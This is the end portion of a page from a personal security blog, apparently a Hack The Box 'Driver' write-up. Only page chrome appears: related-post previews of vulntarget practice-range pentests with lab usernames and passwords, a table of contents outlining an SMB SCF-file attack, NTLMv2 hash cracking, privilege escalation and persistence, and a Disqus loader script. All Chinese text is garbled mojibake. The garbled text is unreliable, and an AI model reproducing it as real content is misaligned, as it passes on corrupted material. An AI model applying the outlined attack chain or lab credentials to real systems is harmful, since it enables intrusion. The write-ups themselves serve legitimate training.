ç«¯å£æ‰«æ å¯¹å¼€æ”¾ç«¯å£æä¾›æœåŠ¡è¿›è¡Œåˆ¤æ–­  ç»è¿‡æ‰«æå‘ç°åç«¯æ˜¯â€aspâ€œ ,æ‰€ä»¥å…¶ä¸€èˆ¬é…å¥—ä¼šæ­sql...</div></div></div></a><a class="pagination-related" href="/posts/3e9a6950.html" title="vulntarget-jé¶åœº"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-15</div><div class="info-item-2">vulntarget-jé¶åœº</div></div><div class="info-2"><div class="info-item-1">vulntarget-jæ‰“é¶è®°å½•ï¼šæ‹“æœ´å›¾å¦‚ä¸‹ï¼š   1.ç¬¬ä¸€å±‚ï¼š1.1ä¿¡æ¯æ”¶é›†ï¼šä½¿ç”¨ä¸€ç³»åˆ—æ‰«æå·¥å…·éƒ½å¯ä»¥è¿›è¡Œåˆæ­¥çš„å‘ç°å·¥ä½œï¼Œnmapï¼Œtscanplusç­‰ï¼Œæˆ‘ç”¨åè€…ï¼š æ‰«å‡ºå¦‚ä¸‹ç«¯å£å¼€æ”¾ï¼š   æœ‰ä¸€äº›æŒ‡çº¹ä¿¡æ¯ä½†æˆ‘æ‰ç–å­¦æµ…ï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥è¿›è¡Œæµ‹è¯•ï¼ æŒ‡çº¹è¯†åˆ«ä¸€æ‰‹ï¼š   æ‰“å¼€å¦‚ä¸‹å‡ ä¸ªç«¯å£å¼€æ”¾ç«™ç‚¹ï¼š  http://192.168.189.138:80/  80ç«¯å£æ˜¯fastadminçš„æ¡†æ¶   æˆ‘æœç´¢äº†è¿™ä¸ªæ¡†æ¶çš„è¯¸å¤šå†å²æ¼æ´éƒ½æ²¡èƒ½æˆåŠŸåˆ©ç”¨ï¼Œé€‰æ‹©å¯¹å…¶ä»–å¼€æ”¾ç«¯å£è¿›è¡Œè¿›ä¸€æ­¥çš„æ¢ç´¢ã€‚ åŸå› ï¼šå¯èƒ½æ˜¯å› ä¸ºå…¶åå°å¯èƒ½å·²ç»ä¸æ˜¯é»˜è®¤è·¯å¾„äº†ï¼Œå†³å®šå°è¯•ä»æ—ç«™æ‰“   http://192.168.189.138:7001/  7001ç«¯å£å¯¹å…¶è¿›è¡Œç›®å½•æ‰«æå·¥ä½œï¼š      æŸ¥è¯¢çŠ¶æ€ç æ˜¯200ï¼Œ301çš„è·¯å¾„ï¼šæœ‰å¦‚ä¸‹æœ‰ä¿¡æ¯å›æ˜¾ï¼š   å‘ç°äº†ï¼šKindeditor ç›´æ¥è®¿é—®é»˜è®¤http:*//192.168.189.138:7001/kindeditor.js*   å¾—çŸ¥å…¶kindeditorç‰ˆæœ¬ï¼šversion 3.5.5  å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼šKindEditor...</div></div></div></a><a class="pagination-related" href="/posts/98ed62e4.html" title="vulntarget-ké¶åœº"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-19</div><div class="info-item-2">vulntarget-ké¶åœº</div></div><div class="info-2"><div class="info-item-1">vulntarget-kæ‰“é¶è®°å½•ï¼šæ­£å¼wpï¼šhttps://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg è´¦å·å¯†ç ä¿¡æ¯ï¼š    ä¸»æœº ä¸»æœºè´¦å·å¯†ç  webè´¦å·å¯†ç     xxl-job-admin xxl-job&#x2F;root123 admin&#x2F;Bolean@10000   nacos-springcloudgateway spring-nacos&#x2F;root123 nacos&#x2F;bolean@1q2   redis redis&#x2F;redis@1z rediså¯†ç ï¼šnbsg@123456   æ‹“æ‰‘å›¾ï¼š   æ€è·¯ï¼šå…¶ä¸­å¤–ç½‘IPæˆ‘è®¾ç½®æˆäº†ï¼š192.168.189.130 ç½‘ç»œé…ç½®æ–‡ä»¶ä¸ºï¼š/etc/netplan/00-installer-config.yaml 123456789101112131415161718network:  ethernets:    ens33:      addresses:      - 192.168.189.130/24      gateway4:...</div></div></div></a><a class="pagination-related" href="/posts/55d580db.html" title="wuxiangæœˆæŒ‘æˆ˜one"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">wuxiangæœˆæŒ‘æˆ˜one</div></div><div class="info-2"><div class="info-item-1">wuxianæ‰“é¶è®°å½•â€”æœˆæŒ‘æˆ˜å…¥å£æœºå™¨10.10.0.3ä½¿ç”¨å¤šç§æ‰«æå·¥å…·å¯¹å…¶è¿›è¡Œç«¯å£æ¢æµ‹ï¼ŒæŒ‡çº¹è¯†åˆ«ç­‰æ¥è¿›è¡Œäº¤å‰éªŒè¯ TscanPlusæ‰«æï¼šæ‰«æç»“æœå¦‚ä¸‹ï¼š    ID Host Port Protocol Target Banner Code Title      1 10.10.0.3 22 SSH 10.10.0.3:22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 0      2 10.10.0.3 3306 MYSQL 10.10.0.3:3306 MySQL 8.0.19 0      3 10.10.0.3 6379 REDIS 10.10.0.3:6379 Redis key-value store 5.0.14 0      4 10.10.0.3 18080 HTTP http://10.10.0.3:18080 APACHE-Shiro 200 DocToolkit     5 10.10.0.3 18088 HTTP http://10.10.0.3:18088 Apache-Tomcat 404 HTTP Status 404 â€“...</div></div></div></a><a class="pagination-related" href="/posts/4f0d5716.html" title="Kerberos-è®¤è¯åŸç†"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-24</div><div class="info-item-2">Kerberos-è®¤è¯åŸç†</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/4a17b156.html" title="vulntarget-ié¶åœº"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-11</div><div class="info-item-2">vulntarget-ié¶åœº</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/mbc.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">icon</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">21</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Iconabc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Iconabc/" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="mailto:2899345299@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">up up</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Driver"><span class="toc-number">1.</span> <span class="toc-text">HTB-Driver:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">æœºå™¨ç®€ä»‹ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">æ¸—é€è¿‡ç¨‹ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E4%BE%A6%E5%AF%9F%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">åˆå§‹ä¾¦å¯Ÿï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">nmapç«¯å£æ‰«æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">nmapè¯¦ç»†ä¿¡æ¯æ‰«æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap-udp%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">nmap udpæ‰«æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">nmapæ¼æ´è„šæœ¬æ‰«æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">web80ç«¯å£æ¸—é€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.1.6.</span> <span class="toc-text">æ”»å‡»é¢åˆ†æï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#smb%E5%85%B1%E4%BA%ABscf%E2%BD%82%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.7.</span> <span class="toc-text">smbå…±äº«scfâ½‚ä»¶æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A"><span class="toc-number">1.2.1.7.1.</span> <span class="toc-text">æ‰©å±•ï¼š</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3NTLMv2%E5%93%88%E5%B8%8C"><span class="toc-number">1.2.1.8.</span> <span class="toc-text">ç ´è§£NTLMv2å“ˆå¸Œ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E7%B3%BB%E7%BB%9F%E7%AB%8B%E8%B6%B3%E7%82%B9%EF%BC%9Atony%E7%9A%84shell"><span class="toc-number">1.2.1.9.</span> <span class="toc-text">å»ºç«‹ç³»ç»Ÿç«‹è¶³ç‚¹ï¼štonyçš„shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.1.10.</span> <span class="toc-text">ææƒæšä¸¾</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9A"><span class="toc-number">1.2.1.10.1.</span> <span class="toc-text">æŸ¥è¯¢ç›¸å…³èµ„æ–™ï¼š</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.2.1.11.</span> <span class="toc-text">æŒä¹…åŒ–</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">æ€»ç»“ï¼š</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/cc605c90.html" title="03-C/C++è½¯ä»¶é€†å‘æŠ€æœ¯">03-C/C++è½¯ä»¶é€†å‘æŠ€æœ¯</a><time datetime="2025-01-09T13:52:21.000Z" title="å‘è¡¨äº 2025-01-09 21:52:21">2025-01-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/be4abe2b.html" title="02-x86_64æ¶æ„æ±‡ç¼–è¯­è¨€">02-x86_64æ¶æ„æ±‡ç¼–è¯­è¨€</a><time datetime="2024-12-26T08:44:51.000Z" title="å‘è¡¨äº 2024-12-26 16:44:51">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/e11d0610.html" title="01-C++åŸºç¡€å­¦ä¹ ">01-C++åŸºç¡€å­¦ä¹ </a><time datetime="2024-12-22T01:59:42.000Z" title="å‘è¡¨äº 2024-12-22 09:59:42">2024-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ad068c24.html" title="å¤šçº§ä»£ç†å·¥å…·">å¤šçº§ä»£ç†å·¥å…·</a><time datetime="2024-12-18T12:33:28.000Z" title="å‘è¡¨äº 2024-12-18 20:33:28">2024-12-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/868e8d19.html" title="ç½‘ç»œé€šä¿¡çŸ¥è¯†ç‚¹å°æ€»">ç½‘ç»œé€šä¿¡çŸ¥è¯†ç‚¹å°æ€»</a><time datetime="2024-12-17T07:23:58.000Z" title="å‘è¡¨äº 2024-12-17 15:23:58">2024-12-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/shuai.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By icon</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="/">icon</a> is striving to become stronger!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="å‰å¾€è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo

  const disqusReset = conf => {
    window.DISQUS && window.DISQUS.reset({
      reload: true,
      config: conf
    })
  }

  const loadDisqus = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyDisqus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    window.disqus_identifier = isShuoshuo ? path : '/posts/23837ad8.html'
    window.disqus_url = isShuoshuo ? location.origin + path : 'https://iconabc.github.io/posts/23837ad8.html'

    const disqus_config = function () {
      this.page.url = disqus_url
      this.page.identifier = disqus_identifier
      this.page.title = 'HTB-Driver'
    }

    if (window.DISQUS) disqusReset(disqus_config)
    else {
      const script = document.createElement('script')
      script.src = 'https://.disqus.com/embed.js'
      script.setAttribute('data-timestamp', +new Date())
      document.head.appendChild(script)
    }

    btf.addGlobalFn('themeChange', () => disqusReset(disqus_config), 'disqus')
  }

  const getCount = async() => {
    try {
      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
      if (!eleGroup) return
      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')

      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=&api_key=&thread:link=${cleanedLinks}`,{
        method: 'GET'
      })
      const result = await res.json()

      const count = result.response.length ? result.response[0].posts : 0
      eleGroup.textContent = count
    } catch (err) {
      console.error(err)
    }
  }

  if (isShuoshuo) {
    'Disqus' === 'Disqus'
      ? window.shuoshuoComment = { loadComment: loadDisqus }
      : window.loadOtherComment = loadDisqus
    return
  }

  if ('Disqus' === 'Disqus' || !false) {
    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
    else {
      loadDisqus()
      
    }
  } else {
    window.loadOtherComment = loadDisqus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>